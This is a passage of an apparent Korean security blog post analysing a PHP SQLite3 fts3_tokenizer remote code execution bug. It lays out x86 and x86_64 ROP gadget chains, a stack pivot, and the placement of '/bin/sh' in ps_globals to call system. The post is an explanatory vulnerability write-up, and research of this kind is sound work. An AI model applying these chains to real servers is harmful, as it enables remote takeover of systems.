pop esi ; ret               --------> libphp5_gadget<span class="token punctuation">(</span><span class="token number">0x000d5902</span><span class="token punctuation">)</span>    -> <span class="token keyword">offset</span><span class="token punctuation">(</span><span class="token number">0x000d5902</span><span class="token punctuation">)</span>  -> server<span class="token punctuation">(</span><span class="token number">0xb71a8902</span><span class="token punctuation">)</span>
;writable <span class="token keyword">memory</span>            --------> libsqlite3<span class="token number">+0x8eaa0</span>                                   -> server<span class="token punctuation">(</span><span class="token number">0xea8aa0</span><span class="token punctuation">)</span>
push esi ; <span class="token keyword">call</span> eax;        --------> libphp5_gadget<span class="token punctuation">(</span><span class="token number">0x0029eb07</span><span class="token punctuation">)</span>    -> <span class="token keyword">offset</span><span class="token punctuation">(</span><span class="token number">0x0029eb07</span><span class="token punctuation">)</span>  -> server<span class="token punctuation">(</span><span class="token number">0xb7371b07</span><span class="token punctuation">)</span></code></pre></div>
<ul>
<li>해당 가젯들은 노출된 메모리 주소에서 offset 계산을 통해 가젯을 선정한 후 쓰기 가 가능한 공간으로 <code class="language-text">libcsqlite3</code> .bss 섹션을 활용합니다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/ElEQVQY01WQSU/CYBRFP8HZhUOiCwIqKlBKoS0dgTKUwVKQAgJGMSb+/z9xTL+di7N4ycu5N1c43pCK6qCbXbzWGL89ofBQkyxWewajBZnDa1TNJ1ntMaweB9kr2kHEevPDfVHj+PSWcJwwne0QptWjWnPRzQDLDSUNM+CpZBDFG7r9GdmjGxTVJZ7vaBiBDHD9MfPkk8KjxsnZHeEoIYq3iKbdl8+p0HZDSV3v8Fw2Wa6/GQwXCHFBperIRqlQiHP8zivbj19y+Soic8kkeudt+YWwveE/oeUM0JtdcnmF4osup1DkJAGliiXbp3cqLis2daODqnnU6i3JH5h2f2FmvciIAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/0c5aaf84765af8a9c30679d4c05294dd/37523/14.png"
        srcset="/static/0c5aaf84765af8a9c30679d4c05294dd/e9ff0/14.png 180w,
/static/0c5aaf84765af8a9c30679d4c05294dd/f21e7/14.png 360w,
/static/0c5aaf84765af8a9c30679d4c05294dd/37523/14.png 720w,
/static/0c5aaf84765af8a9c30679d4c05294dd/715a3/14.png 830w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li><code class="language-text">edx</code> 레지스터에 대입된 <code class="language-text">sqlite3SavedPrng</code> 주소 +0x18 번지로 역참조된 값에 하드 코딩된 값을 집어넣었습니다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABsElEQVQozzVRa3OaUBC9aZq2aSoBY2ulxGiiCEbEIKCCNqLGV0TGaGKtfXzo9P//hNPZdfqBWe7uztnzELV6B+3gAfZdD64foelH0A0Xnz6X8CVfRUl3ULyxcVO+gyRf4vQsi+tSA7rR5NlV0cKr1wqOjmWuouH0EPamKFcctMMx/PYQQXeCiumhVg8wX7xgOt8gTr4jX7SQkjWMp2vEyY5799ECxydpBmNA89ZH0+szCwKvN0I47j1004VR9TGZbTAYJVxVzcSbdx8Z5GHyxH1SJUQK4kg6ANbsAN2vM6bvtYZw3D6zpD5Jc7w+ouESy9Uelh3yYbKFVDzGW56plybkdJ5lC2IXjZaoVD10wjF/QW8KrzXAuZKHEO/R6oywfv6N1eYXtrs/3M/mdH6v1j+x2//lfWZK8uiKQYDdCQNSSLSgXFyxFGKcrPZ4jL9xVS4KyGkGe7hY7pA8/WC7GPDWOqRMKRJbGtAR+pdkjZfoPVu8cBjzeMvysrkyh0XeknTLDiCEdAiFQMlD1x+gcF2HqhlQMgWcpVRO8IOkIp0pMGOqJ28zHA4x/d+jXfLwH6xn97mP1bOQAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="asd.png"
        title="asd.png"
        src="/static/004ea3989fb2f251c19019243f3e9b52/37523/asd.png"
        srcset="/static/004ea3989fb2f251c19019243f3e9b52/e9ff0/asd.png 180w,
/static/004ea3989fb2f251c19019243f3e9b52/f21e7/asd.png 360w,
/static/004ea3989fb2f251c19019243f3e9b52/37523/asd.png 720w,
/static/004ea3989fb2f251c19019243f3e9b52/5a6dd/asd.png 802w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 639px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 51.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABeElEQVQoz42SWXOCQBCEUWO8oiIKiOKNFx4cCqKo8Uoqlcr//zudmjHxQS2Th66dpXa/7ZlGqDVGMMcBxtYKU2cNvW5CklvIZDVo1T6iTwVWJCZe6kcSnpMyJtYKc38Pb3GArHYwsUOIUh1tw2aQEMlfoH+BhXiiBH95wmb3idf9Fyr6kB0X5Tb6Q49dJlIyBCF7gT2CMpAu2u4WUztEodiE0XMZPLXXCFZvMHoOkmkVsbj0H4dF2O4GXnDklpWyAW9x5EeC8B3h5gOWuwHNOpVRb4DXe57hfHHAYnmC6+1QrvR4djRLPzjBD45wZlv0TQ90lloXIrmzorezFZrtKcxJwA5yoo5MtoJ0VkP6ReNgSkqHXZMKxcbPtzbXybRy65DaJXczb4eB6UHTBxeXBKEHcmINUqnFQeULZyDVqUz5FjiaLHnwlrPGwPTZqap1WRV9wP8jBcIt/rZLK+ley5QoQQlAjmilg3SB6mptCKXc5YTvpXrt8Butyv1aAcVepwAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/96c1b55ba8a6a3f9c6e2e70aa1721161/738b8/15.png"
        srcset="/static/96c1b55ba8a6a3f9c6e2e70aa1721161/e9ff0/15.png 180w,
/static/96c1b55ba8a6a3f9c6e2e70aa1721161/f21e7/15.png 360w,
/static/96c1b55ba8a6a3f9c6e2e70aa1721161/738b8/15.png 639w"
        sizes="(max-width: 639px) 100vw, 639px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>가젯 들이 동작을 하면서 마지막으로 시스템 라이브러를 호출하여 Code Execution을 수행합니다.</li>
</ul>
<h1 id="x86_64bit-환경-php-sqlite3-fts3-tokenizer-rce-취약점" style="position:relative;"><a href="#x86_64bit-%ED%99%98%EA%B2%BD-php-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90" aria-label="x86_64bit 환경 php sqlite3 fts3 tokenizer rce 취약점 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>x86_64bit 환경 PHP SQLite3 fts3 tokenizer RCE 취약점</h1>
<ul>
<li>앞서 x86 환경에서의 공통된 취약점을 이용하며 새로운 가젯을 사용해 xCreate의 콜백 함수를 조절해서 원하는 페이로드를 실행하여 RCE를 수행해봅시다.</li>
</ul>
<h3 id="rop를-활용해서-시스템-라이브러리-함수-호출-진행" style="position:relative;"><a href="#rop%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%B4%EC%84%9C-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C-%EC%A7%84%ED%96%89" aria-label="rop를 활용해서 시스템 라이브러리 함수 호출 진행 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ROP를 활용해서 시스템 라이브러리 함수 호출 진행</h3>
<ul>
<li>64bit 환경은 32bit 환경과 다르게 레지스터를 활용해서 인자를 주고 받기 때문에 ROP 구조를 새로 구성합니다.</li>
<li><code class="language-text">[libphp5.so](http://libphp5.so)</code> 공유 라이브러리 안에 실행 권한이 있는 부분의 가젯들을 이용해서 ROP Chain을 설계 해봅시다.</li>
</ul>
<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php">leave<span class="token punctuation">;</span>                     <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span>        <span class="token property">stack</span> pivot
ret<span class="token punctuation">;</span>                       <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span>        <span class="token property">payload</span><span class="token operator">-></span><span class="token property">esp</span>

pop rax<span class="token punctuation">;</span>                   <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span>        <span class="token property">rax</span> <span class="token operator">&lt;</span><span class="token operator">-</span> system_lib
pop rbx<span class="token punctuation">;</span>                   <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span>        <span class="token property">rbx</span> <span class="token operator">&lt;</span><span class="token operator">-</span> wirtable <span class="token function">memory</span><span class="token punctuation">(</span>Cookie_path<span class="token punctuation">)</span>
ret<span class="token punctuation">;</span>

mov rdi<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbx<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span>        <span class="token property">rdi</span> <span class="token operator">&lt;</span><span class="token operator">-</span> <span class="token punctuation">[</span>rbx<span class="token punctuation">]</span> <span class="token function">address</span><span class="token punctuation">(</span>writalbe memory<span class="token punctuation">)</span>
call rax<span class="token punctuation">;</span></code></pre></div>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA3ElEQVQY022QaQuCQBCGzSxLzQPL1qwktYMOy+iQLiio//+P3pipKMgPLzuzMM8+s1KrHWO1vmCzu6IXzlDT2gijFJrhc+q6QEVtQqm6nE8tKw5KZZvP30gESLMT8sMd8TCD3uggGa25jpIVwsECpt2FJFswzACOG4Ik1LoHSS4AksUyOyM/PhhEvScSTOc5h2oaJht6XG/4DFZUt9hQM8QL+DakFQkyme6w2d8wiJdsSMOW00dLJBDBmOFk/QckwDw9YLu/8XrUE8QPxrxa04v47mvYgWn3+C+LDJ+LM32NwjeMOAAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/a71eafd63c47699567611c2dc9fba1ec/37523/16.png"
        srcset="/static/a71eafd63c47699567611c2dc9fba1ec/e9ff0/16.png 180w,
/static/a71eafd63c47699567611c2dc9fba1ec/f21e7/16.png 360w,
/static/a71eafd63c47699567611c2dc9fba1ec/37523/16.png 720w,
/static/a71eafd63c47699567611c2dc9fba1ec/024d6/16.png 961w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>Stack Pivot 가젯을 이용해서 <code class="language-text">ps_globals</code> 구조체의 주소 값을 스택 메모리 상으로 변경하여 ps_globals에 저장되어 있는 필드들을 확인할 수 가 있습니다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABZklEQVQoz3WRa0sCURCGj1oRkZmmqOtdS1td9+Kqu7quq+s188aKJSEI/f//8MYZ8INFHw4Mh+GZZ95hYq0NSe5C0XoQawYkuYOEUIGQfkW+KKMsNpFMVRAMpRCLlxCJFhB+yiNwHYEv8Aj/VfjiMbVho22Ooel96K0BmoaLXFFGtzeDZc/huEsCCRkRk5kH21nAtKa4uY39A9T7aJsjKA0bstojaFUy4AyXGE23mMw9xJNlJIQyVpsvuOMNOtaUYMwXIgivz3AmqxYaTQd1xaK1taaDithCLP4MRbOxXB9gdifgfZlcDb3+Gw3iwyPRPJg/dGnIYS3DJUO+Nq95pozdIZ2tYusdsdufaF1uwc033hEfh2+8VHQwdn8JrKsW1EYfVckkC56pKBk0OZuXCMQhXXtGufH8pvMd5os9HY2x4G/DAWV4PgqvOZT5HlAoKWTzvvrEcLwm4MBd0Z+3P6FU1v4Y/gAHWs8nUgHCoAAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/5442c0b2654c4bd8a7d96d1b3fe4237c/37523/17.png"
        srcset="/static/5442c0b2654c4bd8a7d96d1b3fe4237c/e9ff0/17.png 180w,
/static/5442c0b2654c4bd8a7d96d1b3fe4237c/f21e7/17.png 360w,
/static/5442c0b2654c4bd8a7d96d1b3fe4237c/37523/17.png 720w,
/static/5442c0b2654c4bd8a7d96d1b3fe4237c/a0b80/17.png 955w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>시스템 라이브러리 함수를 호출하기 위해서 스택상에 있는 시스템 라이브러리를 rax 레지스터가 가리키는 형태로 진행 하였습니다.</li>
<li>후, rbx 레지스터를 이용해서 Cookie_path 필드에 삽입한 문자열을 가리키는 주소를 대입합니다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9klEQVQY04WRa1OCQBSGV+1muFwsaAMk0kpBQsQNJJTsMtX//0Nvs2caPjn64Z2deefMs8/ZZbncIc02kMU7kvQVjHFww4Nu+tC4C43fUtfpmZTuidWe+8Kesxpl9YWq/ka1+aFh4T5hFhewrkIEYYK+JtA7HR6FETBOSqxedsjlG5K0otK+mcAPYozu5qibX2T5luwHugvWNY4B1wRTWSy3ZOCIB9xPFvBGEYr1J9SMMj27sME6emu6z5ZF/4Yqy1XTAsNxCuFNIcsPehJ1oTI/79uHDaeRxGxeIMsbWkuV186YDB3xSGBzGIAbPgwrwOVAHPyUPw09mgtiwo4CAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/890cf5761cf6bfb3256b501faa2bc1c6/37523/18.png"
        srcset="/static/890cf5761cf6bfb3256b501faa2bc1c6/e9ff0/18.png 180w,
/static/890cf5761cf6bfb3256b501faa2bc1c6/f21e7/18.png 360w,
/static/890cf5761cf6bfb3256b501faa2bc1c6/37523/18.png 720w,
/static/890cf5761cf6bfb3256b501faa2bc1c6/62de4/18.png 746w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li><code class="language-text">ps_globals</code> cookie_path 필드는 삽입한 페이로드를 가리키는 포인터이기 때문에 rbx 레지스터에 대입을 한 후 참조하는 과정이 필요합니다.</li>
</ul>
<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token number">0x7ff9d4cefbc0</span> <span class="token operator">&lt;</span>ps_globals<span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span><span class="token punctuation">:</span>  <span class="token operator">=></span> <span class="token number">0x00007ff9d8b15908</span>

<span class="token number">0x00007ff9d8b15908</span> <span class="token operator">=></span>  <span class="token string double-quoted-string">"/bin/sh"</span></code></pre></div>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 13.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjElEQVQI112ObwuCMBjEV5qE2dga/RuFWdKb0E2tIFhR3/9DXTyDifjixz3cwx3HbtULdeNQW4c02yOZr8HFERnX2OxKSHXy3iQSmMYS0WzlNdxE+BHMNA735w+mffvwYqlxLi2Ki4FtP9jqK+JE9SHSMUOf0bLu8e0LaWVeVODiAKlyXxYCYcWY4cI/TMBJZVzFvA4AAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/72796d74fdfa4002b09dd9c30cdc6621/37523/19.png"
        srcset="/static/72796d74fdfa4002b09dd9c30cdc6621/e9ff0/19.png 180w,
/static/72796d74fdfa4002b09dd9c30cdc6621/f21e7/19.png 360w,
/static/72796d74fdfa4002b09dd9c30cdc6621/37523/19.png 720w,
/static/72796d74fdfa4002b09dd9c30cdc6621/ddc81/19.png 837w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>rbx 레지스터를 참조한 값을 호출 규약에 맞게 rdi 레지스터에 mov 명령을 통해 대입한 후 code execution을 실행합니다.</li>
</ul>
<h1 id="참조" style="position:relative;"><a href="#%EC%B0%B8%EC%A1%B0" aria-label="참조 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>참조</h1>
<hr>
<p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Qian-Exploring-The-New-World-Remote-Exploitation-Of-SQLite-And-Curl-wp.pdf">us 19 Qian Exploring The New World Remote Exploitation Of SQLite And Curl wp</a></p>
<p><a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf">us 17 Feng Many Birds One Stone Exploiting A Single SQLite Vulnerability Across Multiple Software</a></p>
<div class="table-of-contents">
<ul>
<li>
<p><a href="#php-sandbox">PHP Sandbox</a></p>
<ul>
<li><a href="#php-debugging">PHP Debugging</a></li>
<li><a href="#safe-mode-bypass">Safe Mode Bypass</a></li>
<li><a href="#php-sqlite-%EB%AA%A8%EB%93%88-php-53">PHP SQLite 모듈 (PHP 5.3≥)</a></li>
<li><a href="#fts3_tokenizer-overview">fts3_tokenizer Overview</a></li>
<li><a href="#sqlite-fts3-%EA%B8%B0%EB%8A%A5%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B2%80%EC%83%89-%EB%B0%A9%EC%95%88">SQLite fts3 기능을 활용한 검색 방안</a></li>
<li><a href="#%EC%82%AC%EC%9A%A9%EC%9E%90%EA%B0%80-%EC%A7%80%EC%A0%95%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-tokenizer%EC%9D%98-callback-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EC%8B%9D">사용자가 지정할 수 있는 tokenizer의 Callback 처리 방식</a></li>
</ul>
</li>
<li>
<p><a href="#sqlite-fts3-%EC%B7%A8%EC%95%BD%EC%A0%90">SQLite fts3 취약점</a></p>
<ul>
<li><a href="#fts3-module-base-address-leaked">fts3 module base address leaked</a></li>
<li><a href="#sqlite-fts3_tokenizer-fts3_tokenizer">SQLite fts3_tokenizer(), fts3_tokenizer()</a></li>
</ul>
</li>
<li>
<p><a href="#fts3-callback%EC%9D%84-%ED%86%B5%ED%95%9C-%EC%9E%84%EC%9D%98%EC%9D%98-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89-%EC%B7%A8%EC%95%BD%EC%A0%90">fts3 callback을 통한 임의의 코드 실행 취약점</a></p>
</li>
<li>
<p><a href="#xopen-%EC%B7%A8%EC%95%BD%EC%A0%90">xOpen 취약점</a></p>
</li>
<li>
<p><a href="#exploit-%EA%B3%B5%EA%B2%A9-%ED%9D%90%EB%A6%84%EB%8F%84">Exploit 공격 흐름도</a></p>
</li>
<li>
<p><a href="#x86bit-%ED%99%98%EA%B2%BD-php-with-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90">x86bit 환경 PHP with SQLite3 fts3 tokenizer RCE 취약점</a></p>
<ul>
<li><a href="#fts3_tokenizer-info-leak">fts3_tokenizer info leak</a></li>
<li><a href="#fts3-tokenizer-callback">fts3 tokenizer callback</a></li>
<li><a href="#fts3-tokenizer-%EB%91%90-%EB%B2%88%EC%A7%B8-%EC%9D%B8%EC%9E%90-ebp-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0-%EC%A1%B0%EC%9E%91">fts3 tokenizer 두 번째 인자 ebp 레지스터 조작</a></li>
<li><a href="#stack-pivot%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-payload-data-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%9C%84%EC%B9%98-%EB%B3%80%EA%B2%BD-%EC%9E%91%EC%97%85">Stack Pivot를 이용한 Payload data 메모리 위치 변경 작업</a></li>
<li><a href="#rop-%EA%B8%B0%EB%B2%95%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%88%98%ED%96%89">ROP 기법을 활용하여 RCE 취약점 수행</a></li>
<li><a href="#rop%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%B4%EC%84%9C-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C-%EC%A7%84%ED%96%89">ROP를 활용해서 시스템 라이브러리 함수 호출 진행</a></li>
</ul>
</li>
</ul>
</div></div></div><div class="post-navigator"><div class="post-navigator-card-wrapper"><a class="post-card prev" href="/cve_2012_0002_1-day/"><div class="direction">이전 글</div><div class="title">CVE-2012-0002 1-day 취약점 분석</div></a></div><div class="post-navigator-card-wrapper"><a class="post-card next" href="/project_fuzz_/"><div class="direction">다음 글</div><div class="title">Development of window GUI binary fuzzing using the dump fuzzing theory.</div></a></div></div><div class="utterances"></div></main><footer class="page-footer-wrapper"><p class="page-footer">© <!-- -->2022<!-- --> <a href="https://github.com/dnsdudrla97">Zer0Luck</a></p></footer><div class="dark-mode-button-wrapper"><button class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium dark-mode-button css-1yxmbwk" tabindex="0" type="button"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge dark-mode-icon css-6flbmm" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="DarkModeIcon"><path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9c0-.46-.04-.92-.1-1.36-.98 1.37-2.58 2.26-4.4 2.26-2.98 0-5.4-2.42-5.4-5.4 0-1.81.89-3.42 2.26-4.4-.44-.06-.9-.1-1.36-.1z"></path></svg></button></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/php-sqlite3-1day-rce/";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-1c8b3614439a319fec88.js"],"app":["/app-01fedefb1aba2235d43f.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-337569e9b8b595464a6b.js"],"component---src-pages-404-js":["/component---src-pages-404-js-4af44e3849f20b513e0c.js"],"component---src-pages-about-js":["/component---src-pages-about-js-4e6e8748abdae0a93053.js"],"component---src-pages-index-js":["/component---src-pages-index-js-0efe0b9bc9ce9e041f22.js"],"component---src-templates-blog-template-js":["/component---src-templates-blog-template-js-484a59d2475d768e59bb.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-d285fa677ae56436e6bf.js"]};/*]]>*/</script><script src="/polyfill-1c8b3614439a319fec88.js" nomodule=""></script><script src="/component---src-templates-blog-template-js-484a59d2475d768e59bb.js" async=""></script><script src="/f9d3028dbef90a6e9b8db85387d63dd9f4edf538-350e20f31e27e07c540f.js" async=""></script><script src="/app-01fedefb1aba2235d43f.js" async=""></script><script src="/framework-98bc37d489de49fb3b96.js" async=""></script><script src="/webpack-runtime-73f29b2cfeafab2e462d.js" async=""></script></body></html>